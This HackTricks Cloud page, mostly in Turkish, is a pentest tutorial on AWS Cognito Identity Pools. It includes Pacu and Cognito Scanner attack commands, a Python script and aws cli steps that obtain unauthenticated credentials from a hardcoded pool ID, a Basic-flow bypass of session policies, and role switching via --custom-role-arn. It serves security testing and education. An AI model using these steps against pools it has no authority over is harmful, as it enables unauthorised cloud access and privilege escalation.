# Cognito Identity Pools

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

Kimlik havuzları, kullanıcılarınızın **geçici kimlik bilgileri edinmesini** sağlayarak kritik bir rol oynar. Bu kimlik bilgileri, Amazon S3 ve DynamoDB dahil olmak üzere çeşitli AWS hizmetlerine erişim için gereklidir. Kimlik havuzlarının dikkat çekici bir özelliği, hem anonim misafir kullanıcıları hem de kullanıcı kimlik doğrulaması için bir dizi kimlik sağlayıcısını desteklemeleridir. Desteklenen kimlik sağlayıcıları şunlardır:

* Amazon Cognito kullanıcı havuzları
* Facebook, Google, Amazon ile Giriş ve Apple ile Giriş gibi sosyal oturum açma seçenekleri
* OpenID Connect (OIDC) ile uyumlu sağlayıcılar
* SAML (Güvenlik Beyanı İşaretleme Dili) kimlik sağlayıcıları
* Geliştirici kimlik doğrulamalı kimlikler
```python
# Sample code to demonstrate how to integrate an identity provider with an identity pool can be structured as follows:
import boto3

# Initialize the Amazon Cognito Identity client
client = boto3.client('cognito-identity')

# Assume you have already created an identity pool and obtained the IdentityPoolId
identity_pool_id = 'your-identity-pool-id'

# Add an identity provider to the identity pool
response = client.set_identity_pool_roles(
IdentityPoolId=identity_pool_id,
Roles={
'authenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/AuthenticatedRole',
'unauthenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/UnauthenticatedRole',
}
)

# Print the response from AWS
print(response)
```
### Cognito Sync

Kimlik Havuzu oturumları oluşturmak için önce **bir Kimlik ID'si oluşturmanız** gerekir. Bu Kimlik ID'si, **o kullanıcının oturumunun tanımlayıcısıdır**. Bu tanımlayıcılar, 1MB'a kadar anahtar-değer çiftleri depolayabilen 20'ye kadar veri kümesine sahip olabilir.

Bu, **bir kullanıcının bilgilerini saklamak için faydalıdır** (her zaman aynı Kimlik ID'sini kullanacak olan).

Ayrıca, **cognito-sync** hizmeti, **bu bilgileri yönetmek ve senkronize etmek için** hizmettir (veri kümelerinde, akışlarda ve SNS mesajlarında bilgi göndererek...).

### Tools for pentesting

* [Pacu](https://github.com/RhinoSecurityLabs/pacu), AWS istismar çerçevesi, artık bir hesapta tüm Cognito varlıklarının sayımını otomatikleştiren ve zayıf yapılandırmaları, erişim kontrolü için kullanılan kullanıcı niteliklerini vb. işaret eden "cognito\_\_enum" ve "cognito\_\_attack" modüllerini içermektedir. Ayrıca, kullanıcı oluşturmayı (MFA desteği dahil) ve değiştirilebilir özel niteliklere, kullanılabilir kimlik havuzu kimlik bilgilerine, id token'larındaki üstlenilebilir rollere dayalı ayrıcalık yükseltmeyi otomatikleştirir.

Modüllerin işlevlerinin açıklaması için [blog yazısının](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2) 2. kısmına bakın. Kurulum talimatları için ana [Pacu](https://github.com/RhinoSecurityLabs/pacu) sayfasına bakın.

#### Usage

Belirli bir kimlik havuzu ve kullanıcı havuzu istemcisi karşısında kullanıcı oluşturma ve tüm ayrıcalık yükseltme vektörlerini denemek için örnek cognito\_\_attack kullanımı:
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
Örnek cognito\_\_enum kullanımı, mevcut AWS hesabında görünen tüm kullanıcı havuzlarını, kullanıcı havuzu istemcilerini, kimlik havuzlarını, kullanıcıları vb. toplamak için:
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) is a CLI aracıdır python'da, istenmeyen hesap oluşturma ve kimlik havuzu yükseltme dahil olmak üzere Cognito'ya farklı saldırılar uygular.

#### Kurulum
```bash
$ pip install cognito-scanner
```
#### Kullanım
```bash
$ cognito-scanner --help
```
Daha fazla bilgi için https://github.com/padok-team/cognito-scanner adresini kontrol edin

## IAM Rollere Erişim

### Kimlik Doğrulaması Olmadan

Bir saldırganın, kimlik doğrulaması yapılmamış bir kullanıcı olarak bir Cognito uygulamasında **AWS kimlik bilgilerini almak** için bilmesi gereken tek şey **Kimlik Havuzu ID'sidir** ve bu **ID, web/mobil uygulamada** kullanılması için sabit kodlanmış olmalıdır. Bir ID şu şekilde görünür: `eu-west-1:098e5341-8364-038d-16de-1865e435da3b` (bruteforce edilemez).

{% hint style="success" %}
Oluşturulan **IAM Cognito kimlik doğrulaması yapılmamış rolü varsayılan olarak** `Cognito_<Kimlik Havuzu adı>Unauth_Role` olarak adlandırılır.
{% endhint %}

Eğer sabit kodlanmış bir Kimlik Havuzu ID'si bulursanız ve bu kimlik doğrulaması yapılmamış kullanıcılara izin veriyorsa, AWS kimlik bilgilerini şu şekilde alabilirsiniz:
```python
import requests

region = "us-east-1"
id_pool_id = 'eu-west-1:098e5341-8364-038d-16de-1865e435da3b'
url = f'https://cognito-identity.{region}.amazonaws.com/'
headers = {"X-Amz-Target": "AWSCognitoIdentityService.GetId", "Content-Type": "application/x-amz-json-1.1"}
params = {'IdentityPoolId': id_pool_id}

r = requests.post(url, json=params, headers=headers)
json_resp = r.json()

if not "IdentityId" in json_resp:
print(f"Not valid id: {id_pool_id}")
exit

IdentityId = r.json()["IdentityId"]

params = {'IdentityId': IdentityId}

headers["X-Amz-Target"] = "AWSCognitoIdentityService.GetCredentialsForIdentity"
r = requests.post(url, json=params, headers=headers)

print(r.json())
```
Ya da aşağıdaki **aws cli komutlarını** kullanabilirsiniz:
```bash
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign
aws cognito-identity get-credentials-for-identity --identity-id <identity_id> --no-sign
```
{% hint style="warning" %}
Not edin ki, varsayılan olarak kimlik doğrulaması yapılmamış bir cognito **kullanıcısının hiçbir izni olamaz, hatta bir politika aracılığıyla atanmış olsa bile**. Aşağıdaki bölümü kontrol edin.
{% endhint %}

### Gelişmiş vs Temel Kimlik Doğrulama Akışı

Önceki bölüm **varsayılan gelişmiş kimlik doğrulama akışını** takip etti. Bu akış, oluşturulan IAM rol oturumu için **kısıtlayıcı** [**oturum politikası**](../../aws-basic-information/#session-policies) belirler. Bu politika, oturumun [**bu listedeki hizmetleri kullanmasına**](https://docs.aws.amazon.com/cognito/latest/developerguide/iam-roles.html#access-policies-scope-down-services) izin verecektir (rolün diğer hizmetlere erişimi olsa bile).

Ancak, bunu aşmanın bir yolu vardır; eğer **Kimlik havuzunda "Temel (Klasik) Akış" etkinse**, kullanıcı o akışı kullanarak bir oturum alabilecektir ve bu **kısıtlayıcı oturum politikası** olmayacaktır.

{% code overflow="wrap" %}
```bash
# Get auth ID
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign

# Get login token
aws cognito-identity get-open-id-token --identity-id <identity_id> --no-sign

# Use login token to get IAM session creds
## If you don't know the role_arn use the previous enhanced flow to get it
aws sts assume-role-with-web-identity --role-arn "arn:aws:iam::<acc_id>:role/<role_name>" --role-session-name sessionname --web-identity-token <token> --no-sign
```
{% endcode %}

{% hint style="warning" %}
Eğer bu **hata** ile karşılaşırsanız, bunun nedeni **temel akışın etkin olmamasıdır (varsayılan)**

`GetOpenIdToken işlemi sırasında bir hata oluştu (InvalidParameterException): Temel (klasik) akış etkin değil, lütfen geliştirilmiş akışı kullanın.`
{% endhint %}

Bir dizi IAM kimlik bilgisine sahip olduğunuzda, [hangi erişime sahip olduğunuzu kontrol etmelisiniz](../../#whoami) ve [yetkileri yükseltmeye çalışmalısınız](../../aws-privilege-escalation/).

### Kimlik Doğrulanmış

{% hint style="info" %}
**Kimlik doğrulanmış kullanıcıların** muhtemelen **farklı izinler** alacağını unutmayın, bu nedenle eğer **uygulama içinde kaydolabiliyorsanız**, bunu yapmayı deneyin ve yeni kimlik bilgilerini alın.
{% endhint %}

**Kimlik Havuzuna** erişen **kimlik doğrulanmış kullanıcılar** için de **roller** mevcut olabilir.

Bunun için **kimlik sağlayıcısına** erişiminiz olması gerekebilir. Eğer bu bir **Cognito Kullanıcı Havuzu** ise, belki varsayılan davranışı kötüye kullanarak **kendiniz yeni bir kullanıcı oluşturabilirsiniz**.

{% hint style="success" %}
**IAM Cognito kimlik doğrulama rolü varsayılan olarak** `Cognito_<Kimlik Havuzu adı>Auth_Role` olarak adlandırılır.
{% endhint %}

Her neyse, **aşağıdaki örnek**, bir **Cognito Kullanıcı Havuzu** içinde oturum açmış olduğunuzu varsayıyor (diğer türde kimlik sağlayıcılarının da yapılandırılabileceğini unutmayın).

<pre class="language-bash"><code class="lang-bash">aws cognito-identity get-id \
--identity-pool-id &#x3C;identity_pool_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>

# Önceki komut yanıtından identity_id'yi alın
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>


# IdToken içinde bir kullanıcının erişim sağladığı rolleri bulabilirsiniz çünkü Kullanıcı Havuzu Grupları nedeniyle
# Belirli bir role kimlik bilgilerini almak için --custom-role-arn kullanın
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
<strong>    --custom-role-arn &#x3C;role_arn> \
</strong>    --logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>
</code></pre>

{% hint style="warning" %}
Kullanıcının oturum açtığı kimlik sağlayıcısına veya hatta **kullanıcıya** (iddialar kullanarak) bağlı olarak **farklı IAM rollerini yapılandırmak mümkündür**. Bu nedenle, aynı veya farklı sağlayıcılar aracılığıyla farklı kullanıcılara erişiminiz varsa, **oturum açmak ve hepsinin IAM rollerine erişmek** faydalı olabilir.
{% endhint %}

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
